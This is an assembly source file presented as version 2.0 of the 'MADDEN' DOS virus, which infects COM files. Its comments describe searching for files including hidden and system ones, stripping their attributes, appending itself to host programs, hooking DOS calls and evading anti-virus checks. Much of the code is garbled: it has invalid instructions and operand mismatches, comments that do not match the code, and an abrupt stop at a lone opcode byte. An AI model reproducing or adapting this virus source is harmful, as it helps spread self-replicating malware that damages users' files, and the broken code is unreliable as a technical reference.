;        The MADDEN virus
;
;        Version 2.0
;
;        The original source of Maddens Virs 2.4 is used to make this version.
;        This way, no bug-checkers will find any traces of the old virus,
;        and all features are still there...
;
;        Written by : Henkie Dijkstra / Sector Infector
;

code    segment public 'code'
        assume cs:code,ds:code

progr   proc    far

; As the virus is made for COM-files only, the COM-signature is left at
; the start (4B4Dh). Also the entry point is at offset 3, so the IP at
; start will be 0003h.

        org     0003h

; Below you see the different labels, depending on wether the virus runs
; alone or if it's an infected program. Because all code is loaded at
; a random location by the drop technique, CS won't hold the code start.
; Therefore DS will be used to determine the correct code start.

start:
        mov     ax,ds                       ; MOV AX,DS:[03]
        add     ax,10h                      ; Original starting value

old_code:
        push    ds
        push    si                          ; SP will be used to determine
        sub     si,si                       ; the virus length
        push    ax
        mov     ah,2Ch
        int     21h                         ; Get time
        cmp     dl,5                        ; Seconds = 5?
        jnz     not_infected                ; No

        xor     bx,bx                       ; Begin dropping from segment 0000h
        call    search_free                 ; Search for a hole somewhere

        cmp     ax,-1                       ; Enough memory?
        jz      not_infected                ; No
        mov     byte ptr ds:[bx],0E9h       ; Jmp XXXh
        mov     ax,dx                       ; Store two bytes of host
        mov     ds:[bx+3],ah                ; and calculate infection length
        mov     cx,4000h                    ; CX-1 (=infection length) segments
        div     cl                        ; Page?

        test    dl,0F0h                     ; Yes?
        jnz     not_infected                ; No
        mov     ah,dl                       ; Adjust infection length
        sub     cx,ax

; Here the virus will move to the found space. First the part below this
; procedure will be moved.

        dec     si                          ; SP points to the beginning
        add     si,offset old_code          ; of the code to be moved

        mov     cx,cs:[si]                  ; Length of code
        inc     cx
        inc     cx                          ; Length of code + 2

        push    ds                          ; Save ES
        push    bx                          ; Restore afterwards
        pop     es
        mov     di,bx                       ; Destination
        add     di,cx                       ; Destination = segment:start
        mov     si,sp                       ; Already in DS
        rep     movsb                       ; Move code

; Now move the part above this procedure too.

;        pop     es                          ; ES already restored
        mov     cx,di                       ; CX=start
        sub     di,offset old_code          ; DI=start of code above
        push    bx                          ; Restore BX
        pop     ds
        mov     si,sp                       ; SP=segment of code above
        add     si,si                       ; SP++
        rep     movsb                       ; Move code

        push    bx                          ; Save BX again
        pop     ds
        mov     dx,offset new_DTA           ; New DTA
        add     dh,di                       ; $A5 ($$A5)
        mov     ah,1Ah
        int     21h                         ; Set DTA

        mov     byte ptr ds:[bx+70h],1Fh    ; If EXE-Runtime library is used
                                            ; the File Time will be changed.
                                            ; With my 21h/2Fh function it's
                                            ; impossible to detect, with this
                                            ; method almost all files will
                                            ; have their attribute changed.

        mov     ah,4Eh                      ; Find first ASK
        mov     cx,20h                      ; Hidden/System

find_next_file:
        call    dos                         ; Do DOS-function
        jc      restore_ret                 ; No more files

        mov     dx,0BCh                     ; Path is stored in DTA

        mov     ax,4300h                    ; Get FCB attributes
        int     21h                         ; Check if directory
        jnc     get_attribs                ; Normal file

        xchg    ch,cl                       ; Directory -> normal file
        jmp     find_next_file              ; Check next file

get_attribs:
        mov     ax,4305h                    ; Set FCB attributes
        int     21h                         ; Remove System and Hidden

open:
        mov     cx,0FFFh                    ; Open read/write
        mov     ah,3dh                      ; Do DOS-function
        int     21h

        xchg    bx,ax                       ; File handle in BX

read_buffer:
        mov     ax,4202h                    ; Make seek pointer end-of-file
        cwd                                 ; Seek offset
        int     21h                         ; Don't forget!

        sub     ax,12                       ; Jump over buffer

        mov     word ptr [bx+4],ax          ; Put 12 in buffer

        mov     dx,bx                       ; DX=File handle
        mov     ds,dx                       ; DS=File handle
        mov     ax,4300h                    ; Get file attributes
        int     21h                         ; Check if system

        pop     bx
        push    bx                          ; Restore BX
        jz      close                       ; Is directory -> normal file

        mov     cx,word ptr ds:[di+1Ah]     ; New infection lenght
        sub     cx,12
        mov     word ptr ds:[di+1ACh],cx

        mov     ah,42h                       ; Read buffer full?
        cwd                                  ; Offset 0
        int     21h                         ; Check

        jc      close                       ; Yes

        mov     dx,word ptr ds:[di+1ACh]    ; Bufferfull?

        mov     cx,dx                       ; Infection length
        mov     dx,bx                       ; DX=Filehandle
        mov     ah,40h                      ; Write operation
        int     21h                         ;

close:
        mov     ah,3eh                      ; Close file
        int     21h

        pop     bx                          ; Restore BX
        push    ds
        pop     ax
        sub     ax,cx                       ;
        mov     ds,ax                       ; DS=random segment
        cmp     word ptr ds:[di+14h],0E9h   ; Virus still running?
        jz      self_repl                   ; Yes

not_infected:

restore_return:
        mov     ah,1Ah                      ; Restore DTA
        mov     dx,1C0h                     ; Default DTA
        cmp     byte ptr cs:[far_data+1],2  ; Coming from infected ANTi-Virus?
        jz      quit                        ; Yes, don't do that

        int     21h                         ; No, restore DTA

quit:
        ret                                   ; Start host program

new_DTA label near

self_repl:
        mov     ax,4301h                    ; Restore attributes
        xor     cx,cx                       ; Only normal files
        int     21h

        cmp     word ptr ds:[di+1ACh],0FFFF ; Is already infected?
        jnz     infect                      ; No

        jmp     restore_return              ; Yes, return to host

infect:
        mov     ax,4301h                    ; Restore attributes
        and     cx,0F8h                     ; System/Hidden
        int     21h

        mov     ah,2Fh                      ; Get internal DOS-data
        int     21h                         ; DS:DX points to DTA

        mov     ax,4E00h                    ; Find first (again)
        mov     cx,7

        jmp     short find_next_file

restore_ret:
        cmp     byte ptr cs:[far_data],3
        jz      restore_caller

        jmp     short restore_return


restore_caller:
        pop     si
        mov     ax,[si]

        add     si,si                       ; Correct SI
        mov     bp,ss:[si+4]                ; IP in BP
        mov     di,ss:[si[6]]               ; CS in DI

        mov     word ptr cs:[caller+2],bp   ; Store caller
        mov     cs:[caller],di

        add     cs:[caller+2],cs:[caller_ofset]         ; Correct jump

        mov     si,4Ch                      ; Address of Dos-call
        push    cs
        pop     ds
        mov     dx,offset dos_call          ; $AA
        mov     ah,15h                      ; Re-install VxDosCall handler
        int     21h                         ; DOS-Driver

        db      0EAh                       